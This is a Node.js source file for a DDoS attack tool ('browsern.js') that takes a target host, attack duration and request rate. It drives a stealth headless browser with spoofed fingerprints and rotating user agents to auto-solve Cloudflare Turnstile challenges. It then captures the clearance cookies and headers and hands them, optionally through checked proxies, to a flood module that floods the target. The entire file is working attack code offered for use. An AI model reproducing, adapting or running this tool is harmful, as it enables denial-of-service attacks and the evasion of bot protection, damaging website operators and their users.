const async = require("async");
const axios = require('axios');
const fs = require("fs")
const os = require('os');
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const anonymizeUA = require("puppeteer-extra-plugin-anonymize-ua")();
const resemble = require('resemblejs');
const flood = require('./flood');
var HeadersBrowser = '';

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
puppeteer.use(anonymizeUA);

if (process.argv.includes('-h') || process.argv.includes('--help')) {
  console.log(`
Usage: node browsern.js <host> <duration> <rates> [options]

Bypass Cloudflare Turnstile and Custom Cloudflare Turnstile protections

Arguments:
  <host>                 Target host (e.g., http://example.com)
  <duration>             Attack duration per second
  <rates>                Requests rate per second

Options:
  --proxy <file>              Set proxy server file
  --fingerprint <type>        Set fingerprints types (basic, advaced)  [default: none]
  --dratelimit <true>/false>  Set Automating ratelimit detection [default: false]
  -h, --help                  Display help and usage instructions
  `);
  process.exit(0);
}

if (process.argv.length < 5) {
    console.error("node browsern <duration> <rates> <proxyFile> [options]");
    process.exit(1);
}

const host = process.argv[2];
const duration = process.argv[3];
const rates = process.argv[4];
const args = process.argv.slice(5);

const proxyIndex = args.indexOf('--proxy');
const proxyFile = proxyIndex !== -1 ? args[proxyIndex + 1] : null;

const fingerprintIndex = args.indexOf('--fingerprint');
const fingerprints = fingerprintIndex !== -1 ? args.slice(fingerprintIndex + 1).filter(arg => !arg.startsWith('--')) : [];
const validFingerprints = ['basic', 'advanced'];
const invalidFingerprints = fingerprints.filter(f => !validFingerprints.includes(f));
if (invalidFingerprints) {
} else {
  console.error(`[INFO] Fingerprint valid types: basic, advanced`);
  process.exit(1);
}

const userAgents = [
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36 Edg/116.0.1938.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36 Edg/116.0.1938.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.92 Safari/537.36 Edg/117.0.2045.31',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.89 Safari/537.36 Edg/118.0.2088.76',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36 Edg/115.0.1901.188',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36 Edg/114.0.1823.82',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36 Edg/113.0.1774.57',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36 Edg/112.0.1722.64',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.148 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36 Edg/110.0.1587.57',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.100 Safari/537.36 Edg/119.0.2110.39',
];

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

async function spoofFingerprintBasic(page) {
    await page.evaluateOnNewDocument(() => {
        delete navigator.__proto__.webdriver;

        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 24,
                pixelDepth: 24
            }
        });
        Object.defineProperty(window, 'chrome', { get: () => undefined });

        Object.defineProperty(navigator, 'plugins', {
            value: [{ description: 'Portable Document Format', filename: 'internal-pdf-viewer', length: 1, name: 'Chrome PDF Plugin' }]
        });

        Object.defineProperty(navigator, 'languages', {
            value: ['en-US', 'en']
        });

        Object.defineProperty(navigator, 'platform', {
            value: 'Win32'
        });

        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
        });

        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: 4
        });

        Object.defineProperty(navigator, 'deviceMemory', {
            value: 8
        });
    });
}

async function spoofFingerprintAdvanced(page) {
    await page.evaluateOnNewDocument(() => {
        delete navigator.__proto__.webdriver;

        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 24,
                pixelDepth: 24
            }
        });
        Object.defineProperty(window, 'chrome', { get: () => undefined });

        Object.defineProperty(navigator, 'plugins', {
            value: [{ description: 'Portable Document Format', filename: 'internal-pdf-viewer', length: 1, name: 'Chrome PDF Plugin' }]
        });
        Object.defineProperty(navigator, 'pdfViewerEnabled', {
            get: () => true,
        });

        Object.defineProperty(navigator, 'languages', {
            value: ['en-US', 'en']
        });

        Object.defineProperty(navigator, 'platform', {
            value: 'Win32'
        });
	Object.defineProperty(navigator, 'brands', {
            get: () => ({
              brands: [{"brand":"Not A;Brand","version":"8"},{"brand":"Chromium","version":"108"},{"brand":"Google Chrome","version":"108"}],
            }),
        });

        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
        });

        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: 4
        });

        Object.defineProperty(navigator, 'deviceMemory', {
            value: 8
        });
        Object.defineProperty(window.Notification, 'permission', {
            get: () => 'granted',
        });
    });
}
async function TurnstileCustom(browser, page) {
    const Turnstile = await page.$('.main-wrapper');
    if (Turnstile) {
      console.log('[INFO] Custom Cloudflare Turnstile found');

      await page.click('.main-wrapper');
      console.log('[DEBUG] Mouse clicked on TurnstileBox');

      await sleep(3);
    } else {
     console.log('[INFO] Bypass Failed');
    }
}


async function detectChallenge(browser, page) {
    const content = await page.content() ;
    if (content.includes("challenge-platform")) {
        try {
            await sleep(5);
            const clx = 533;
            const cly = 289;

            await page.screenshot({ path: '01.png',
              clip: { x: 503, y: 225,
                   width: 307, height: 125,
              },
            });
            const image1 = fs.readFileSync('01.png');
            const image2 = fs.readFileSync('./ex/captcha.png');
            const compareImages = (image1, image2) => {
              return new Promise((resolve, reject) => {
                resemble(image1)
                 .compareTo(image2)
                 .ignoreColors()
                 .onComplete((result) => {
                  const misMatch = parseFloat(result.misMatchPercentage);
                  if (misMatch === 0) {
                    resolve(true);
                  } else {
                   TurnstileCustom(browser, page);
                   resolve(false);
                   return;
                  }
                 });
              });
            };

            const shouldProceed = await compareImages(image1, image2);
            if (!shouldProceed) return;
            console.log('[INFO] Cloudflare Turnstile Detect');
            await sleep(0.5);
            await page.mouse.click(clx, cly, { delay: Math.floor(Math.random() * 100)});
            console.log('[DEBUG] Mouse clicked at (533, 289)');
        } catch (error) {
            console.log(`[ERROR] ${error}`);
        } finally {
            await sleep(3);
            return;
        }
    }
}

async function openBrowser(host, proxy = null) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const options = {
      headless: 'new',
      args: [
          ...(proxy ? [`--proxy-server=${proxy}`] : []), // Gunakan spread operator
          "--no-sandbox",
          "--no-first-run",
          "--test-type",
          "--user-agent=" + userAgent,
          "--disable-browser-side-navigation",
          "--disable-blink-features=AutomationControlled",
          "--disable-extensions",
          "--disable-gpu",
          "--ignore-certificate-errors",
      ],
      ignoreHTTPSErrors: true,
      javaScriptEnabled: true,
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        console.log(`[ERROR] Browser ${error}`);
        return;
    }
    try {
        const [page] = await browser.pages();
        const client = page._client();
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id });
            }
        });
        await page.setViewport({ width: 1920, height: 1080 });
        page.setDefaultNavigationTimeout(60 * 1000);
        if (fingerprints.includes('basic')) {
          await spoofFingerprintBasic(page);
        };
        if (fingerprints.includes('advanced')) {
          await spoofFingerprintAdvanced(page);
        };

        const BrowserPage = await page.goto(host, { waitUntil: "domcontentloaded" });
	page.on('dialog', async dialog => {
          await dialog.accept();
        });
        console.log(`[INFO] Browser Opening Host Page ${host}`);

	const status = await BrowserPage.status();
        console.log(`[INFO] Status Code: ${status}`);

        const title = await page.evaluate(() => document.title);
        if ( title === 'Just a moment...' || title ==='Checking your browser...') {
          console.log(`[INFO] Title: ${title}`);

          await page.on('response', async resp => {
            HeadersBrowser = resp.request().headers();
          });

          await detectChallenge(browser, page);

          const PageTitle = await page.title();
          console.log(`[INFO] Title Page: ${PageTitle}`);

          const cookies = await page.cookies();
          if (cookies.length > 0) {
            const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
            console.log(`[INFO] UserAgent: ${userAgent}`);
            console.log(`[INFO] Cookies: ${_cookie}`);
          }
          return {
              title: PageTitle,
              headersall: HeadersBrowser,
              cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
              userAgent: userAgent,
              proxy: proxy,
          };
        } else if (title === "Attention Required! | Cloudflare") {
           console.log('[INFO] Geoblock detected, Title ${title}');
           await browser.close();
        } else {
         console.log(`[INFO] No Cloudflare, Title: ${title}`);
         await browser.close();
        }
    } catch (error) {
        console.log(`[ERROR] ${error}`);
    } finally {
        await browser.close();
    }
}

async function Start(host) {
  try {
     const response = await openBrowser(host);
     if (response) {
       if (response.title === "Just a moment..." || response.title === 'Checking your browser...') {
         console.log("[INFO] Failed to bypass Cloudflare");
         await Start(host);
         return;
       }
       const timeout = setTimeout(async () => {
         console.log(`[INFO] Stopping browser and flood process.`);
         process.exit(0);
         }, duration * 1000);
       if (proxyFile) {
         flood(host, duration, rates, response.userAgent, response.cookies, response.headersall, response.proxy);
       } else {
        flood(host, duration, rates, response.userAgent, response.cookies, response.headersall);
       }
     }
  } catch (error) {
    console.log(`[ERROR] ${error}`);
  }
}
async function checkProxy(proxy) {
  try {
    const [host, port] = proxy.split(':');
    const response = await axios.get('http://httpbin.org/ip', {
      proxy: {
        host: host,
        port: parseInt(port),
      },
      headers: {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      },
      timeout: 5000
    });
    return response.status === 200;
  } catch (error) {
    console.log(`[INFO] Proxy ${proxy} is not active`);
    return false;
  }
}
async function RunWithProxy(proxyFile) {
  const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(line => line.trim());
  const fileContent = fs.readFileSync(proxyFile, 'utf-8');
  for (let proxy of proxies) {
    const isActive = await checkProxy(proxy);
    if (isActive) {
      console.log(`[INFO] Proxy ${proxy} active`);
      await Start(host, proxy);
      break;
    }
  }
}

if (proxyFile) {
  RunWithProxy(proxyFile);
} else {
  Start(host);
}
